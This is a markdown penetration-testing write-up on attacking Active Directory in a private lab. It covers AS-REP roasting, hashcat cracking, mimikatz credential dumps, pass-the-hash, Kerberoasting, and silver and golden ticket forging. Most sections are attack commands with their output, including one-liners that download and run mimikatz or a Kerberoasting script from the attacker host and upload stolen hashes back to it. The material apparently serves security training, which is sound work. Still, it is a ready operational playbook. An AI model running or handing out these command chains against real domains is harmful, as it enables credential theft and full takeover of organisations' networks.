## Attacking Active Directory

[Active Directory Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

### Lab Environment

|Server|IP Address|OS|Function|
|---|---|---|---|
|kali.vx|192.168.17.10|Kali Linux 2022.3|Attacking Machine|
|dc.lab.vx|192.168.17.11|Windows Server 2022|Domain Controller|
|svr.lab.vx|192.168.17.12|Windows Server 2022|Domain Member Server, SQL Server|
|client.lab.vx|192.168.17.13|Windows 11|Domain Member Workstation, SQL Server Management Studio|

<details>
  <summary><h1>Nmap Scan</h1></summary>

```console
root@kali:~# nmap -p- -sV -Pn 192.168.17.11-13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 12:29 +08
```

#### Domain Controller

```
Nmap scan report for 192.168.17.11
Host is up (0.00090s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-25 04:32:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.vx0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.vx0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
57911/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57912/tcp open  msrpc         Microsoft Windows RPC
57924/tcp open  msrpc         Microsoft Windows RPC
57929/tcp open  msrpc         Microsoft Windows RPC
57960/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Domain Member Server, SQL Server

```
Nmap scan report for 192.168.17.12
Host is up (0.0011s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Domain Member Workstation

```
Nmap scan report for 192.168.17.13
Host is up (0.0013s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ssl/ms-wbt-server?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Time Taken

```
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
```

</details>

## 1. AS-REP Roasting

AS-REP Roasting is a quick way to scan for entry into the domain when you do not know much about the domain yet

### 1.1. The theory

AS-REP Roasting is a technique that allows retrieving password hashes for users that have Kerberos preauthentication disabled

![image](/images/kerberos-preauthentication.png)

When preauthentication is **enabled**:
- A user sends an Authentication Server Request (`AS-REQ`) message to the DC
- The timestamp on that message is encrypted with the hash of the user’s password
- If the DC can decrypt that timestamp using the user’s password hash on record, it sends back an Authentication Server Response (`AS-REP`) message that contains a session key and a Ticket Granting Ticket (`TGT`) issued by the Key Distribution Center (`KDC`), which is used for future access requests by the user

If preauthentication is **disabled**:
- A user can request authentication data for any user and the DC would return an `AS-REP` message
- The session key part of the `AS-REP` message is encrypted using the user’s password hash, which can be used to brute-force the user’s password offline

### 1.2. Use kerbrute to find users with preauthentication disabled

[Kerbrute](https://github.com/TarlogicSecurity/kerbrute) is a script from TarlogicSecurity which uses impacket library to perform kerberos bruteforcing

Install kerbrute

```console
root@kali:~# pip3 install kerbrute
Collecting kerbrute
  Downloading kerbrute-0.0.2-py3-none-any.whl (17 kB)
Requirement already satisfied: impacket in /usr/lib/python3/dist-packages (from kerbrute) (0.10.0)
Requirement already satisfied: dsinternals in /usr/lib/python3/dist-packages (from impacket->kerbrute) (1.2.4)
Installing collected packages: kerbrute
Successfully installed kerbrute-0.0.2
```

```console
root@kali:~# kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain lab.vx -dc-ip 192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Valid user => cindy
[*] Valid user => dave
[*] Valid user => john
[*] Valid user => luke [NOT PREAUTH]
[*] Valid user => mike [NOT PREAUTH]
[*] Valid user => paul
[*] Valid user => ruth
[*] Valid user => steve
[*] Valid user => svr
[*] No passwords were discovered :'(
```

### 1.3. Use GetNPUsers.py to get password hashes

> [!Tip]
> 
> All Impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`

```console
root@kali:~# impacket-GetNPUsers lab.vx/luke -no-pass -dc-ip 192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for luke
$krb5asrep$23$luke@LAB.VX:83a8d136c9ba393dd708c9aa7592627c$14923c61398475cc0472ed6f9d32058fd2cc40f303bbf4eb0fd7df2bffd0fd9dcb9471ed8dfa40e816f7dc6852b736a89c8ab0d1176f4d37b4c3359639df8d068f05305b51e7d0ed46902c5a7c038565d734a581600ac7619279f9f58c810766abf462b666f5e161f2e4f0a7d00dd4f35220f0e4c7803a291a02aec1f4206b066c6203d72d53b5d87a50d3ec446c9a03744f9662395fe402002859554873cfdccd06a55517072304a3939825068ac58be739c4732cae4efb95bd99fd29a21dfa15c53baff833f0003b56e48037404f6256413fed0c02623ba87b6c6a2d347129

root@kali:~# impacket-GetNPUsers lab.vx/mike -no-pass -dc-ip 192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for mike
$krb5asrep$23$mike@LAB.VX:16b0315eceaf3c550a69927d62456d9d$821259e1e9980ad1d2fe42f2278c09ebec3aa95cfb361df26ea424d544a79a0f01ee594a13f486086976f469671319da5b60fd334ce103c87d3ac57082820063bad67799e3670e8774594d7a7138caa8892e0cfaec067c19aaf8b32be13f92d302ba0f3b1875a4b030002e447579d3950a9843012c53687ce1342d1a2da0de3dad94b54f56bcfc7d3e07a09b91d81ca94d80690f9db7e0921c20d223f4b6db66ad94b3aa5a89b392fedd8e69428ea27359f80b7c00df0c8075f7fa1543c9f27956e5d5950e14b4405d7c5aeec255d3df1ecabdc05e5a0a892c00cb2e415e8cf7
```

### 1.4. Use hashcat to crack the hashes

```console
root@kali:~# hashcat -m 18200 GetNPUsers.out /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
⋮
$krb5asrep$23$mike@LAB.VX:•••hash-truncated•••:P@ssw0rd
$krb5asrep$23$luke@LAB.VX:•••hash-truncated•••:P@ssw0rd

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
⋮
Started: Wed Dec  7 07:54:16 2022
Stopped: Wed Dec  7 07:54:44 2022
```

### 1.5. Connect to target

#### 1.5.1. Using evil-winrm

- WinRM `5985` must be enabled on the target
- User must be a member of `Remote Management Users` on the target

```console
root@kali:~# evil-winrm -i 192.168.17.11 -u mike -p P@ssw0rd

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mike\Documents>
```

#### 1.5.2. Using impacket-psexec

The user must be administrator on the target because PsExec uses the `ADMIN$` to run the service manager

```console
root@kali:~# impacket-psexec lab.vx/mike:P@ssw0rd@192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.17.11.....
[*] Found writable share ADMIN$
[*] Uploading file UJIrOtIJ.exe
[*] Opening SVCManager on 192.168.17.11.....
[*] Creating service AXhI on 192.168.17.11.....
[*] Starting service AXhI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1129]
(c) 2016 Microsoft Corporation. All rights reserved.
```

## 2. Cached Credential Storage and Retrieval

**On Kali:** Prepare web server for `mimikatz` download

Prepare files to web server root

```sh
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
```

**On Target:** Download and run `mimikatz`

|   |   |
|---|---|
|certutil|`certutil.exe /urlcache /f /split http://kali.vx/mimikatz.exe %TEMP%\mimikatz.exe && %TEMP%\mimikatz.exe`|
|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe','%TEMP%\mimikatz.exe'); Start-Process %TEMP%\mimikatz.exe`|

**On Target:** mimikatz commands

- Ref: <https://tools.thehacker.recipes/mimikatz>

|Command|Function|
|---|---|
|`privilege::debug`|Requests the debug privilege `SeDebugPrivilege`; required to debug and adjust the memory of a process owned by another account|
|`token::elevate`|Impersonates a SYSTEM token (default) or domain admin token (using `/domainadmin`)|
|`lsadump::sam`|Dumps the local Security Account Manager (SAM) NT hashes; operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM)|
|`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
|`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|

> [!Important]
> 
> mimikatz needs to run from an elevated shell
>
> <details><summary>running mimikatz from a non-elevated shell will not work:</summary>
> 
> ```cmd
> mimikatz # privilege::debug
> ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
> 
> mimikatz # token::elevate
> Token Id  : 0
> User name :
> SID name  : NT AUTHORITY\SYSTEM
> 
> mimikatz # lsadump::sam
> Domain : CLIENT
> SysKey : 732c3b24f5f9c476753d4d1bc72961d7
> ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
> ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)
> 
> mimikatz # lsadump::lsa /patch
> ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)
> 
> mimikatz # sekurlsa::logonpasswords
> ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
> ```
> 
> </details>

<details>
  <summary><h3>2.1. Successful <code>lsadump::sam</code> example</h3></summary>

```cmd
mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
Local SID : S-1-5-21-1540030335-1244868743-683777651

SAMKey : 3e3e9d70bd634ed43edbe5548d50e40e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
⋮

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5a2b1b78290d381def497905d467fcff

Supplemental Credentials:
⋮

RID  : 000003eb (1003)
User : localadmin
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
    lm  - 0: 16c96a30f045654ca0f5277d816dc3fc
    ntlm- 0: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
⋮
```

</details>

<details>
  <summary><h3>2.2. Successful <code>lsadump::lsa /patch</code> example</h3></summary>

```cmd
mimikatz # lsadump::lsa /patch
Domain : CLIENT / S-1-5-21-1540030335-1244868743-683777651

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003eb (1003)
User : localadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 5a2b1b78290d381def497905d467fcff
```

</details>

<details>
  <summary><h3>2.3. Successful <code>sekurlsa::logonpasswords</code> example</h3></summary>

```cmd
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 7831562 (00000000:0077800a)
Session           : Interactive from 0
User Name         : mike
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 9:13:04 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1105
        msv :
         [00000003] Primary
         * Username : mike
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 0c6f0ff405f11531e7cd38a3f89ad32f
        ⋮

Authentication Id : 0 ; 3508055 (00000000:00358757)
Session           : Interactive from 1
User Name         : domainadmin
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 8:48:56 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1104
        msv :
         [00000003] Primary
         * Username : domainadmin
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 66880edfa688d3f7b7ab4a215cee53a7
        ⋮

••• OUTPUT TRUNCATED •••
```

</details>

## 3. Pass the Hash

> [!Note]
> 
> LM hashes are not used from Windows 10 onwards
> 
> Use either `00000000000000000000000000000000` (32 zeros) or `aad3b435b51404eeaad3b435b51404ee` (LM hash of `NULL`) to fill the LM hash portion for `impacket-psexec` or `pth-winexe`

### 3.1. Using evil-winrm

- WinRM `5985` must be enabled on the target
- User must be a member of `Remote Management Users` on the target

```console
root@kali:~# evil-winrm -i 192.168.17.11 -u domainadmin -H e19ccf75ee54e06b06a5907af13cef42

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\domainadmin\Documents>
```

### 3.2. Using impacket-psexec

```console
root@kali:~# impacket-psexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.12 cmd
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.17.12.....
[*] Found writable share ADMIN$
[*] Uploading file HwVcVIgn.exe
[*] Opening SVCManager on 192.168.17.12.....
[*] Creating service Dwks on 192.168.17.12.....
[*] Starting service Dwks.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1129]
(c) Microsoft Corporation. All rights reserved.
```

<details>
  <summary><h3>3.3. Using  pth-winexe</h3></summary>

- **Requires SMB1** to be enabled on target, otherwise `ERROR: Failed to open connection - NT_STATUS_CONNECTION_RESET`

#### 3.3.1. Domain account

```console
root@kali:~# pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.12 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
lab\domainadmin

C:\Windows\system32>hostname
hostname
SVR
```

#### 3.3.2. Local account

```console
root@kali:~# pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.12 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
svr\administrator

C:\Windows\system32>hostname
hostname
SVR
```

</details>

<details>
  <summary><h3>3.4. Using mimikatz - sekurlsa::pth + PsExec</h3></summary>

#### 3.4.1. Domain account

- On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
- The `sekurlsa::pth` will spawn a new cmd window

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : domainadmin
domain  : lab.vx
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
⋮
```

- Connect to the target machine in the new cmd window

```cmd
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\dc cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\domainadmin

C:\Windows\system32>hostname
DC
```

#### 3.4.2. Local account

- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just use `*` or `workgroup` for the `/domain` option

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : administrator
domain  : *
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
⋮
```

- Connect to the target machine in the new cmd window
- ❗ `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because PsExec uses the `ADMIN$` to run the new cmd

```cmd
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\svr cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
svr\administrator

C:\Windows\system32>hostname
SVR
```

</details>

## 4. Service Account Attack

### 4.1. Discover SPNs

```cmd
C:\Users\mike>setspn -Q */*
Checking domain DC=lab,DC=vx
CN=ADFS Service Account,CN=Users,DC=lab,DC=vx
        host/fs.lab.vx
CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
        MSSQLSvc/SVR.lab.vx:1433
        MSSQLSvc/SVR.lab.vx
⋮
```

### 4.2. Kerberoasting

#### 4.2.1. Extract service ticket hashes

##### Option 1: Extract on Windows target using Invoke-Kerberoast script from powershell-empire

**On Kali**: Prepare web server for `Invoke-Kerberoast.ps1` download

Prepare files to web server root

```sh
cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 /var/www/html
```

**On Target**: Download and run `Invoke-Kerberoast.ps1`

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"
```

Upload the hash to Kali (Apache2 is already running with uploads folder and `upload.php` configured)

|   |   |
|---|---|
|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://kali.vx/upload.php','tgs.hash')`|
|cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"tgs.hash" -v http://kali.vx/upload.php`|

Move hash file to working folder: `mv /var/www/html/uploads/tgs.hash .`

##### Option 2: Extract from Kali Linux using GetUserSPNs using Impacket

> [!Tip]
>
> All Impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`

```console
root@kali:~# impacket-GetUserSPNs lab.vx/john:P@ssw0rd -dc-ip 192.168.17.11 -outputfile tgs.hash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName      Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
------------------------  --------  --------  --------------------------  --------------------------  ----------
host/fs.lab.vx            ADFSSVC             2022-10-24 12:52:02.493613  2022-11-02 08:14:53.777575
MSSQLSvc/SVR.lab.vx:1433  MSSQLSVC            2022-10-24 12:52:02.806113  2022-11-02 08:14:41.802510
MSSQLSvc/SVR.lab.vx       MSSQLSVC            2022-10-24 12:52:02.806113  2022-11-02 08:14:41.802510
```

#### 4.2.2. Cracking service account hash using hashcat

```console
root@kali:~# hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
⋮
$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*•••hash-truncated•••:P@ssw0rd
$krb5tgs$23$*MSSQLSVC$LAB.VX$lab.vx/MSSQLSVC*•••hash-truncated•••:P@ssw0rd
$krb5tgs$23$*ADFSSVC$LAB.VX$lab.vx/ADFSSVC*•••hash-truncated•••:P@ssw0rd
```

### 4.3. Silver Ticket

#### 4.3.1. Retrieve domain's numeric identifier

Security Identifier or SID format: `S-R-I-S`
- `S` - A literal `S` to identify the string as a SID
- `R` - Revision level, usually set to `1`
- `I` - Identifier-authority value, often `5` within AD
- `S` - Subauthority values:
  - Domain's numeric identifier, e.g. `21-1470288461-3401294743-676794760`
  - Relative identifier or RID representing the specific object in the domain, e.g. `1105`

```cmd
C:\Users\mike>whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
```

#### 4.3.2. Generate hash value for service account password

```cmd
mimikatz # kerberos::hash /password:P@ssw0rd
        * rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42
        * aes128_hmac       f67365e0a00838aff75e6ca33f3c2be2
        * aes256_hmac       9e0de99003a18068f2e2186cd1162e9b6398f7b873854ccf16040ce16aa06d26
        * des_cbc_md5       76fdfece25e3da54
```

#### 4.3.3. Purge existing kerberos tickets

> [!Important]
>
> Run `kerberos::purge` even if `klist` show zero cached tickets

```cmd
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
```

#### 4.3.4. Generate KRB_TGS ticket

> [!Tip]
>
> The service identifies the user using the SID, the user name can be anything like `nonexistentuser`

```cmd
mimikatz # kerberos::golden /user:nonexistentuser /domain:LAB.VX /sid:S-1-5-21-1470288461-3401294743-676794760 /id:1105 /target:svr.lab.vx:1433 /service:MSSQLSvc /rc4:e19ccf75ee54e06b06a5907af13cef42 /ptt
User      : nonexistentuser
Domain    : LAB.VX (LAB)
SID       : S-1-5-21-1470288461-3401294743-676794760
User Id   : 1105
Groups Id : *513 512 520 518 519
ServiceKey: e19ccf75ee54e06b06a5907af13cef42 - rc4_hmac_nt
Service   : MSSQLSvc
Target    : svr.lab.vx:1433
Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
```

#### 4.3.5. Verify ticket

```cmd
C:\Users\dummy>klist

Current LogonId is 0:0x3441a5

Cached Tickets: (1)

#0>     Client: nonexistentuser @ LAB.VX
        Server: MSSQLSvc/svr.lab.vx:1433 @ LAB.VX
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/18/2022 9:15:16 (local)
        End Time:   4/15/2032 9:15:16 (local)
        Renew Time: 4/15/2032 9:15:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

#### 4.3.6. Attempt login to service

```cmd
C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
1> SELECT SYSTEM_USER;
2> GO

--------------------------------------------------------------------------------------------------------------------------------
LAB\nonexistentuser

(1 rows affected)
```

## 5. Golden Ticket

### 5.1. Using impacket

If you already have password or hash of domain admin user, the attack can be performed from Kali via impacket

> [!Tip]
>
> All Impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`

#### 5.1.1. Retrieve krbtgt password hash

```console
root@kali:~# impacket-secretsdump -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.11
⋮
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
⋮
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:09320ee4ca4f627b183bba1335d1c0c7:::
⋮
```

#### 5.1.2. Uplookup domain SID

```console
root@kali:~# impacket-lookupsid -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.11
⋮
[*] Domain SID is: S-1-5-21-2009310445-1600641453-2559099802
⋮
```

#### 5.1.3. Create golden ticket

```console
root@kali:~# impacket-ticketer -nthash 09320ee4ca4f627b183bba1335d1c0c7 -domain-sid S-1-5-21-2009310445-1600641453-2559099802 -domain lab.vx administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for lab.vx/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in administrator.ccache
```

#### 5.1.4. Use the golden ticket to connect to **any** domain machine

The `-k` option of `impacket-psexec` means use Kerberos authentication; it grabs credentials from ccache file specified in `$KRB5CCNAME` environment variable

```console
root@kali:~# export KRB5CCNAME=administrator.ccache

root@kali:~# impacket-psexec lab.vx/administrator@svr.lab.vx -k -no-pass -target-ip 192.168.17.12 -dc-ip 192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.17.12.....
[*] Found writable share ADMIN$
[*] Uploading file ZnEsDRVp.exe
[*] Opening SVCManager on 192.168.17.12.....
[*] Creating service ORJv on 192.168.17.12.....
[*] Starting service ORJv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1129]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### 5.2. Using mimikatz

#### 5.2.1. Retrieve krbtgt password hash

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : LAB / S-1-5-21-1470288461-3401294743-676794760
⋮
RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 3ac4cccaca955597db0d11a7ffa50025
⋮
```

#### 5.2.2. Create golden ticket

- This can be performed on any domain member machine, without administrator rights
- The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session

> [!Important]
>
> Run `kerberos::purge` even if `klist` show zero cached tickets

```cmd
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:nonexistentuser /domain:lab.vx /sid:S-1-5-21-1470288461-3401294743-676794760 /krbtgt:3ac4cccaca955597db0d11a7ffa50025 /ptt
User      : nonexistentuser
Domain    : lab.vx (LAB)
SID       : S-1-5-21-1470288461-3401294743-676794760
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 3ac4cccaca955597db0d11a7ffa50025 - rc4_hmac_nt
Lifetime  : 23/4/2022 4:05:49 pm ; 20/4/2032 4:05:49 pm ; 20/4/2032 4:05:49 pm
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'nonexistentuser @ lab.vx' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
```

#### 5.2.3. Use the golden ticket to connect to **any** domain machine

- Verify golden ticket in session

```cmd
C:\Users\john>hostname
CLIENT

C:\Users\john>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.17.13
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.17.1

C:\Users\john>klist

Current LogonId is 0:0x50b951

Cached Tickets: (1)

#0>     Client: nonexistentuser @ lab.vx
        Server: krbtgt/lab.vx @ lab.vx
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 4/23/2022 15:47:53 (local)
        End Time:   4/20/2032 15:47:53 (local)
        Renew Time: 4/20/2032 15:47:53 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- Attempt to connect to domain member machine

```cmd
C:\Users\john>PsExec.exe \\SVR.lab.vx cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
